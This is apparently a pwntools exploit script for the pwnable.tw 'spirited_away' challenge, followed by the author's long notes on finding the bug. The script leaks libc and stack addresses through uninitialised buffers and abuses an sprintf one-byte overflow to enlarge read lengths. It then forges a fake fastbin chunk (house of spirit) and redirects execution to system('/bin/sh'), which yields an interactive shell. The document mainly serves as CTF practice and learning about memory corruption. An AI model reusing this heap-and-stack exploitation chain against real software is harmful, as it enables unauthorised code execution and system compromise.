

#!/usr/bin/env python3
from pwn import *
from sys import argv
binary=ELF("./spirited_away",checksec=0)
context.log_level='DEBUG'
if len(argv)>1 and argv[1]=="-r":
    libc=ELF("./libc_32.so.6",checksec=False)
    libc_offset=libc.symbols['_IO_file_sync']-(7+207)
    p=remote("chall.pwnable.tw", 10204)
#    p=remote("localhost",9999)
else:
    libc=ELF("/usr/lib32/libc.so.6", checksec=False)
    libc_offset=0
    p=binary.process()
s=lambda x,r="":p.sendlineafter(r,x) if r else p.sendline(x)
fill=lambda name, age, reason, comment: \
    (
    s(name, "Please enter your name: "),
    s(age, "Please enter your age: "),
    s(reason, "movie?"),
    s(comment, "comment:")
    )
fill2=lambda name, reason, comment: \
    (
    s(name, "Please enter your name: "),
    s(reason, "movie? "),
    s(comment, "comment: "),
    s("y", "<y/n>: ")
    )
## leak libc through uninitalized buffer
fill("AAAA","aaaa","C"*24,"AAAA")
p.recvuntil("C"*24)
base=(int.from_bytes(p.recv(4),"little") - libc_offset) # & ~0xfff # mask ls 12 bits
s("y", "<y/n>: ")

## leak stack through uninitialized buffer
# we need this since we have to constuct a house of spirit attack, so we either need a heap leak or
# a stack leak. We also need the ability to overwrite a pointer, which we will probably do with the
# buffer overflow thanks to the snprintf.

s("1", "Please enter your name: ")
s("D"*80, "movie? ")
s("1", "comment: ")
p.recvuntil("D"*80)
stack=int.from_bytes(p.recv(4),"little")
s("y", "<y/n>: ")


for i in range(1,100,1):
    fill2("1","1","1")
    if b"Wrong" in p.recvline():
        s("y","<y/n>: ")

print(hex(stack))
pause()
while b"Please enter your name: " in p.recvline(): 
    p.sendline("1")
    sleep(.1)
#s("y","<y/n>: ")


# as we can see, the pointer is literally adjacent to our comment buffer that we can overflow thanks
# to our sprintf single byte overflow. this will result in a free(), invalid pointer because we have
# overwritten the pointer with a non dereferencable address.
#
# there are other causes that trigger this abort, but we now know that we can freely control the
# address we want to pass to free. Now, all we have to do is craft our chunk, and we can gain a
# write what where.
#

s("A","?")
s("A","comment:")
s("y","<y/n>: ")


# chunk size it allocates is 72 (usable) and 81 (real)
# the metadata will represent the metadata we must forge and usable will be the memory we have to
# use or clear.
#
# we must also craft the chunk on the stack, as we do not control the pointer returned by
#
#

fake_chunk=p32(0)
fake_chunk+=p32(0x41)
fake_chunk+=b"B"*60
#fake_chunk+=p32(0)
fake_chunk+=p32(0x10000) # next chunk size

system=libc.symbols['system']
bin_sh=next(libc.search(b"/bin/sh"))

fill2("A", fake_chunk, b"B"*0x54+p32(stack-0x70+8))

s(b"A"*76+p32(system+base)+p32(0xdeadbeef)+p32(bin_sh+base), "Please enter your name: ")
s("A", "movie? ")
s("A", "comment: ")
s("n", "<y/n>: ")
p.interactive()

"""
why is cnt value in bss only 2 bytes large? integer overflow??
no nevermind, i see a fun vulnerability

we might have a single byte overflow in the sprintf function, the only reason i found this was
thanks to my list of vulnerable symbols to always check within a pwn binary. sprintf was very high
on the list thanks to the vulnerabilities that may arise from it.

fmt string vulns for one, and less commonly more complex buffer overflows that arent so obvious to the
developer. what the sprintf function will do, is no matter what format string is used, it will be
changed to its ascii representation.

This means that if you have the decimal value 1, and you were to:

sprintf(buffer, "%d", 1);

it would literally turn 1 into '1'/0x31 and copy it into the char buffer, so if we continue to increment
the comments, we can effectively overflow the buffer at [ebp-0xe8]

now all we have to look for is what value, and where are we overflowing.

the overall string is "%d comment so far. We will review them as soon as we can"

so 'n' is the char that is currently overflowing, and it seems as though there is a 199 limit to
the number of reviews we can perform so there is really no way to overflow more than one byte. lets
check the adjacent memory to our sprintf'd buffer and see if this is the vuln or a rabbit whole :(

uh waht. we have a stale stack uaf?
wowowow this is very cool as well, we can effectively read the stack thanks to this vuln, but it does
seem extremely intentional.

for one, there cannot be any null bytes as it would lead to null terminated string so there MUST not
be a canary turned on, and the binary must also be 32 bit. 64 bit addressing mode will most likely
have much more null bytes randomly, so those conditions must all be matched for a scenario like this
to occur.

okay, i will first work on the leak then.

leak is happening with the uninitialized reason buffer. The reasoning behing this is actually very
interesting and was something i was very confused with a while ago.

so first things first, random access memory is simply space for your data. the stack's memory, heap's
memory, and executable memory have no real properties other than permissions and data. a string is no
different than an integer, and so forth.

Memory is only dictated by certain permissions and conventions put in place and enforced in 
order to make things run smoothly, this is true for the stack as well. It is simply a conventional
area in which we can quickly allocate, access, and have the ability for automatic deallocation. This
stack data structure is not easily corruptable and provides much needed speed and value to our
programs.

so lets take a look at what happens to the stack frames when we "nest" stack frames and call multiple
functions within an existing stack frame.

+------+ <- entry's stack frame, rbp
|      |
+------+ <- rsp

here, we have our stack frame from entry. we have not called main through __libc_start_main, so we
only have the current functions stack frame. lets take a look at what happens when we call main

push rbp ; mov rbp, rsp ; sub rsp 0x10

+------+ <- previous entry's stack frame
|      |
+------+ <- rbp
|saved | <- saved rbp, since we pushed it onto the stack (wherever rsp is pointing to)
+------+
|AAAAAA| <- we have data written onto the "stack", which is just a designated boundary of memory
+------+ <- rsp

and so, it will not tamper with the previous stack frames memory, but also have a quick way to 
access and automatically deallocate memory that had been allocated on the stack. lets say we are done
with main, we want to go back.

leave ; ret

the leave instruction is a single instruction which represents the deallocate and restoration of
the previous stack frame:

pop rbp ; mov rsp, rbp

so we execute these instructions, lets take a look at the stack again

+------+ <- rbp, rsp
|      |
+------+
         <- saved rbp is gone, it had been popped back into rbp
 AAAAAA  <- PREVIOUS DATA STILL EXISTS HERE


but now as we already know, memory is memory. The frame that i am showing, there is no real
fragmentation between the stack and any other region of memory. it is all one contiguous chunk of
memory, which means the data that had previously been written there still exists.

There is also an important concept that must be understood about the term "deallocation". This term
really means to forget about memory, or to lose access to it. If our operating system decided to clear
out the memory everytime our stack frame returned that would be even slower than windows 10 on a
raspberry pi zero (not really, but it would be extremely inefficient).

So that memory still exists, the only thing that dictates our stack are the registers that point to
where our boundaries *should* be. and this is the little flaw within von neumann's computer 
architecture.

Since there is no distinguishing factor between executable code, and data, they may take up the same
memory space and thus, giving way to a much more efficient use of memory. But this also means that
since we have no ability to distinguish code from data, we can use our data to tamper with the code.

this is the essential idea of memory corruption vulnerabilities.

alright, so that was the stale stack uaf that allows us to read from the stack. lets leak libc :)

okay, libc was a pain to leak but i got it

also, it seems to be overflowing the "enter your name" read length

i know this is due to the fact that read is not being called, exactly when we reach a 2 digit
number.

each string is null terminated, so this must be the problem, then when you reach 3 digits, it will
overflow the char 'n' into the length, thus giving us a read size of 0x3c to 0x6e

we are overflowing the heap in this case, so we would need to leak and calculate the base adddress
of the heap. we can easily mask least significant 3 lsb so no need for real calculation. Then, we
will have to find a way to overwrite the actual pointer that is being freed?

how are we going to do that, the pointer is allocated on the stack within the lifetime of the
survey function. How are we to overwrite it?

hmhm, it seems as though the heap overflow seg faults, not aborts. that is important as heap
corruption is either detected, or goes by unnoticed. There are no inherent segmentation faults
that come with heap overflows unless we, by chance, tampered with something important.

even if we overwrote the wilderness, that would abort with a SIGABORT, not a SIGSEGV

vewy inwesting, cwould it be that we hwave overwwitten something impwortant?

│           ; var char *var_e8h @ ebp-0xe8
│           ; var int32_t var_b0h @ ebp-0xb0    ; name counter; 0x3c
│           ; var int32_t var_ach @ ebp-0xac    ; reason/why counter ; 0x50
│           ; var void *s @ ebp-0xa8            ; comment buffer on stack ; 0x50
│           ; var int32_t var_58h @ ebp-0x58
│           ; var void *ptr @ ebp-0x54
│           ; var char *format @ esp+0x4
│           ; var size_t nbyte @ esp+0x8

        sym.imp.memset(&s, 0, 0x50);
        ptr = (void *)sym.imp.malloc(0x3c);
        sym.imp.printf("\nPlease enter your name: ");
        sym.imp.fflush(_reloc.stdout);
        sym.imp.read(0, ptr, var_b0h);
        sym.imp.printf("Please enter your age: ");
        sym.imp.fflush(_reloc.stdout);
        sym.imp.__isoc99_scanf(0x80489d2, &var_58h);
        sym.imp.printf("Why did you came to see this movie? ");
        sym.imp.fflush(_reloc.stdout);
        sym.imp.read(0, auStack84, var_ach);
        sym.imp.fflush(_reloc.stdout);
        sym.imp.printf("Please enter your comment: ");
        sym.imp.fflush(_reloc.stdout);
        sym.imp.read(0, &s, var_b0h);

OH I FOUND IT!

look, we can gain a stack AND heap overflow thanks to the single byte overflow

look at the var_b0h/ebp-0xb0 variable. it is being used to read into the heap AND stack buffer

stack buffer is 0x50 bytes in size, 'n' is 0x6e so we can overflow 30 bytes into the stack
i doubt this will allow us to overwrite the return address, but i guess we can now overwrite the
pointer on the stack. Now all we need is a heap leak, and craft a fake fastbin chunk since this
is glibc 2.23.

we write from low addresses to higher addresses, so lets check the stack variables to see what we
can overwrite
"""


